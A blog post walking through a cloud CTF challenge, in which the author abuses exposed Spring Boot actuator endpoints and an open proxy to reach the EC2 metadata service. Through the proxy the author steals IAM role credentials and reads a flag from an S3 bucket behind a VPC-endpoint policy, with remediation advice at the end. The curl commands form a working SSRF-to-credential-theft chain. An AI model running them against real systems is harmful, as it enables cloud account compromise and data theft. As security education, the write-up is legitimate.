:page/title Wiz Cloud Security Championship Problem 1: Perimeter Leak
:blog-post/author {:person/id :lkn}
:blog-post/created-at 2026-03-23
:blog-post/tags [:wiz :security :aws]
:blog-post/header-image /header/images/wiz-security-championship-perimiter-leak/preview.png
:open-graph/image /opengraph/wiz-security-championship-perimiter-leak.png
:open-graph/description A lesson in cloud configuration
:blog-post/preview
My writeup for Problem 1 of the Wiz Cloud Security Championship
:page/body

Welcome to the first of a series of posts on the [Wiz Cloud Security
Championship](https://cloudsecuritychampionship.com/)!

A series of cloud-based CTF challenges around various aspects of cloud
with a new problem being released each month. I started these a bit
late, so there'll be a backlog of posts for a bit.

Each scenario is built by a Wiz researcher and includes a number of
hints, which I obviously won't be spoiling! Code blocks have also been
omitted for brevity in places, demarked by `...` characters.

Without much ado, let's get cracking.

# Problem

>  After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket.
>
> It won't be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents.
>
>Good luck!

Okay so we have identified some thing from this. We haven't looked at the server yet, but from this problem we know:

- There's an S3 bucket containing our data
- There's "some" policy preventing anything outside of the VPC the bucket is in from access (this _may_ come up later)

Cool! Now for our server prompt.

```
You've discovered a Spring Boot Actuator application running on AWS: curl <url>
```

It probably doesn't matter, but I've redacted my URL anyway. You'll see your URL there.

Anyway, that's more info right there. But what can we do with this? Well, this is where domain knowledge kind of helps you cut through a bit and I'll save you having to Google around; [actuator](https://docs.spring.io/spring-boot/docs/2.5.6/reference/html/actuator.html#actuator.endpoints). By default, Spring Boot applications include a number of endpoints that can provide some useful introspection. They are a security nightmare and should be turned off in production, but based on the nature of this CTF my first thought was these are probably on....

## Spring Boot environment

For what we want, there's a few we'd be interested in:

- `/actuator/env` to dump out the entire environment
- `/actuator/mappings` to list out all the available "mappings" (what Spring Boot calls endpoints)

So let's hit them and see what we get back, piping them to `jq` as they look like a large blob of JSON.

```shell {.command-line data-user="user" data-host="monthly-challenge"}
curl $URL/actuator/env | jq
```
```json
...
"BUCKET": {
    "value": "challenge01-470f711",
    "origin": "System Environment Property \"BUCKET\""
},
...
```

Aha! So we have our first piece of important intel, _a_ bucket
name. As there's little else useful in the environment, we have to
reasonably assume this may be our target bucket so we'll store this
for later.

```shell {.command-line data-user="user" data-host="monthly-challenge"}
export BUCKET=challenge01-470f711
```

So let's take a brief pause and assess the situation and rethink what we currently know:

- The name of _a_ bucket (assuming it's the right one, but we don't know for sure yet)
- A Spring Boot application that also resides in AWS and the same VPC as this bucket (another clue that this is probably our bucket)

... But we don't know at all how we can use this application. Wouldn't it be nice if Spring Boot had a way to list all the endpoints?

## Spring Boot has a way to list all the endpoints

When I touched on actuator above briefly, I pointed to two endpoints we may care about. We checked the environment, so now let's check the endpoints.

```shell {.command-line data-user="user" data-host="monthly-challenge"}
curl $URL/actuator/mappings
```
```json
...
{
  "predicate": "{ [/proxy], params [url]}",
  "handler": "challenge.Application#proxy(String)",
  "details": {
    "handlerMethod": {
      "className": "challenge.Application",
      "name": "proxy",
      "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
    },
    "requestMappingConditions": {
      "consumes": [],
      "headers": [],
      "methods": [],
      "params": [
        {
          "name": "url",
          "negated": false
        }
      ],
      "patterns": [
        "/proxy"
      ],
      "produces": []
    }
  }
},
...
```


This looks interesting! What we have found looks to be some way to
proxy a URL .... somewhere. Obviously we have no way to download the
application or look at the bytecode or something, so we have to try
some good old fashioned "trial-and-error".

What if we try hitting something like whatsmyip? Not the most useful
but maybe we can find the IP of the service?

```shell {.command-line data-user="user" data-host="monthly-challenge"}
curl $URL/proxy?url=https://ifconfig.me
```
```json
{"timestamp":"2026-04-07T10:02:34.992+00:00","status":400,"error":"Bad Request","message":"Expected value like 'url=https://checkip.amazonaws.com'.  This proxy passes along headers and different request types. Error: 418 I_AM_A_TEAPOT \"This proxy can only be used to contact host names that match IP addresses or include amazonaws.com\"","path":"/proxy"}
```

Well look at that, we got an implementation detail!

This is actually a huge finding for us for a couple of reasons:

- The proxy passes along headers and request types, so whatever we pass locally will be carried over.
- There is some basic URL filtering to only allow Amazon services to be hit.

This is a clever filter, but it also doubles as a clue. What could we use here?

Well, assuming you're not super familiar with AWS (I know those of you
reading it that know the answer are fervently yelling at your screen)
let's build some requirements for what we want quickly. We want some
way to introspect on the service firstly, since we pass through
headers we can also authenticate against this service so that only
valid AWS resources could query it. If we could pretend to be a
resource, we could then just hit this service.

Well, it _just so happens_ that such a service exists...

## IMDSv2

Amazon's Instance Meta Data Service (hereby referred to as IMDS) is a
service that enables an _authenticated_ resource to query things about
itself. Exactly what you can query is a bit out of scope for this, but
I do encourage you to [RTFM
(politely)](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
in detail.

It sounds like a service that is vulnerable to all _kinds_ of issues,
but the keyword there is **authenticated** services. This seems like
our window, as we can use our proxy URL in theory to pretend we're
that. But wait, what if the hostname doesn't meet the
`*.amazonaws.com` restriction? That's the beauty, _there is no
hostname_. It's an IP-only service.

First let's try and grab a token, as we need to authenticate against it:

```shell {.command-line data-user="user" data-host="monthly-challenge"}
curl -X PUT "$URL/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```
```shell
IamABigLongTokenStringthatISHOuldHAVEusedanAItoGenerate1231==
```

Bingo! We have now proven our assumption that we can pretend to be
this vulnerable service. Using our obviously not fake token, we can
now hit the IMDS and learn a bit more about our vulnerable service.

```shell {.command-line data-user="user" data-host="monthly-challenge"}
curl -H "X-aws-ec2-metadata-token: $TOKEN" $URL/proxy?url=http://169.254.169.254/latest/meta-data
```
```shell
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

Doing so lists all the available endpoints that we can query against the IMDS. What looks interesting here? Well, to answer that let's take a step back and do another quick review of what we know:

- The name of _a_ bucket (assuming it's the right one, but we don't know for sure yet)
- A Spring Boot application that also resides in AWS and **the same VPC as this bucket** (another clue that this is probably our bucket)
- The fact that this application can send traffic to services pretending to be said application

So given those facts, and the important highlighted bit in particular, we have an idea of what we want to look for now:

**Same VPC likely means the same IAM role** (not always and _definitely_ not good practice, but we have to make unsafe assumptions).

So we have a hypothesis now, are there any endpoints that look like they can help us? Well, `iam/` and `identity-credentials/` look like decent candidates, so let's query them and see what we get back.

```shell {.command-line data-user="user" data-host="monthly-challenge" }
curl -H "X-aws-ec2-metadata-token: $TOKEN" $URL/proxy?url=http://169.254.169.254/latest/meta-data/iam/
```
```shell
info
security-credentials/
```

Diving deeper into `security-credentials/` we see a role in there, and if we query it we end up with:

```shell {.command-line data-user="user" data-host="monthly-challenge" }
curl -H "X-aws-ec2-metadata-token: $TOKEN" $URL/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge-5592368
```
```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-04-08T06:49:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "keyid",
  "SecretAccessKey" : "keytoken",
  "Token" : "reallylongtoken",
  "Expiration" : "2026-04-08T12:50:31Z"
}
```

Those look like credentials to me!

Running `aws configure` and plugging those fields into the prompts and then running `aws sts get-caller-identity` to see who we're logged into as gives us:

```shell {.command-line data-user="user" data-host="monthly-challenge" }
aws sts get-caller-identity
```
```json
{
    "UserId": "AROARK7LBOHXDP2J2E3DV:i-0bfc4291dd0acd279",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279"
}
```

We now are logged into the `aws` CLI as the account that owns the EC2 instance, and since we have a theory that the bucket is managed by the same account, let's try and list the bucket and see what we get

```shell {.command-line data-user="user" data-host="monthly-challenge" }
aws s3 ls --recursive s3://$BUCKET
```
```shell
2025-06-18 17:15:24         29 hello.txt
2025-06-16 22:01:49         51 private/flag.txt
```

Magic! We're in!

Our hypothesis was proven right after all, and this should hopefully
highlight the significance of the [Principle of Least
Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege),
but back to our main task.

We see the flag there, so let's grab it and be done with this!

```shell {.command-line data-user="user" data-host="monthly-challenge" }
aws s3 cp s3://$BUCKET/private/flag.txt
```
```shell
download failed: s3://challenge01-470f711/private/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden
```

So close...

Okay, so we're stuck?

Let's take a step back and look at the policy for the bucket, maybe there's a clue there.

```shell {.command-line data-user="user" data-host="monthly-challenge" }
aws s3api get-bucket-policy --bucket $BUCKET
```
```json
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470f711/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
```

Poorly formatting JSON aside, we can plainly see here that all
requests to hit the private folder are denied unless you're on that
VPC ID, _which we have already proven applies to our vulnerable
application_.

So what we'd like here is some way to generate some URL that we can
pass to `/proxy` to query the file for us. Thankfully, S3 has a good
solution to this in the form of `aws s3 presign`! This is generally
what client applications use to allow users to download files from S3
without needing to expose the bucket policy. A short-lived token is
generated allowing temporary one-time access.

So we can do that here, with a neat trick from [`jq`][1], and then use
our proxy application to get the file contents!

```shell {.command-line data-user="user" data-host="monthly-challenge" }
curl $URL/proxy?url=$(aws s3 presign s3://$BUCKET/private/flag.txt | jq -R -r @uri)
```
```shell
The flag is: <nice try>
```

And we're done!

# Fixing the problem

So as well as solving these problems for fun, I like to also use them
as a learning opportunity. We've done the red team bit, now let's do
the blue team bit.

What was our root to compromise here?

- An improperly secured Spring Boot application that allowed actuator endpoints to be queried
- An endpoint to proxy traffic with basic filtering and support for any headers
- A single IAM role that controlled 2 resources
- Weak bucket policy

So let's attack these and see what we can do!

## Spring Boot actuator endpoints

This was our initial entry point that allowed us to move laterally
around the estate, so _in theory_ if this was secured we would not
have been able to figure out the information we needed as easily. Our
reconnaissance was made trivial by this as we got the target bucket
straight away nearly.

Disabling these is actually quite simple, just needs this line in the application properties

```properties
management.endpoints.enabled-by-default=false
```

Or more granularly with

```properties
management.endpoint.health.enabled=false
management.endpoint.info.enabled=false
```

And done! Easy peasy.

## Proxy endpoint

Finding an endpoint like this is like finding money on the
street. It's like finding _a bag_ of money on the street. It's like
finding _a bag of money on the street **and a free ticket to
Defcon**_. Seriously, if you're lucky enough to find one of these
that's as unrestricted as this, you better start getting ready to
collect a big payout.

In this case, the absolute bare minimum in terms of security was in
place. A very basic URL check to ensure that all URLs end in the
amazonaws.com domain, and nothing else.

In an ideal world, there's a number of fixes we'd want to apply here,
a very non-exhaustive list would include:

- **Allowlist rather than denylist** :: Something is bound to be missed
  from the denylist, so deny by default and build up an allowlist
  slowly and as limited as is in-scope

- **Strip headers** :: Allowing headers to be forwarded is part of
  what makes our attack possible. If we weren't able to authenticate
  against IMDS, we would have to work a lot harder to get the
  credentials we needed, maybe even locked out completely.

- **Authenticate the endpoint** :: This also would have completely
  locked us out and would have forced us to attempt to hijack someone
  else's token. This point also has a sliding scale from a fixed API
  key all the way up to a proper OAuth flow, but even just a static
  API key would have been an improvement.

Those 3 things alone would have completely stopped us from being able to proceed.

## IAM role

Generally, an IAM role should only be able to access a single resource
and as limited amount of that resource as it needs to. Here we have an
EC2 instance and a bucket (maybe other resources, but I'm not here to
do a cloud security review) both on the same VPC that can be accessed
by the role. This was also critical for our ability to pivot around
the estate in one swoop.

Unfortunately here, I'm not aware of any solid remediations (I'm still
learning constantly too, if you have an improvement shout about it in
the comments!) outside of really architectural fixes. The problem we
have is the traffic comes from inside the VPC originating from the
proxy endpoint.

Ensure that whatever environment around the proxy application is
limited as much as possible to mitigate against the risk of the hijack
attempt.

Another possible fix here would be to add a custom header that you
strip before forwarding and inject (doesn't matter what it is, just as
long as someone hitting the proxy can't override it) and then using
that header to block traffic.

## Weak bucket policy

This was also another key to our victory; and like the IAM role is
hard to _cleanly_ fix. The same fixes apply here as in the previous
section.

# Summary

These puzzles are really good, they're simple enough but also
challenging in the right ways. I hope this write-up encouraged you to
try and solve it yourself (paradoxically I know, but maybe you didn't
read every section).

[1]: `jq  -R -r @uri` here escapes the URL in the `uri` query parameter so that it can be passed literally to the proxy endpoint
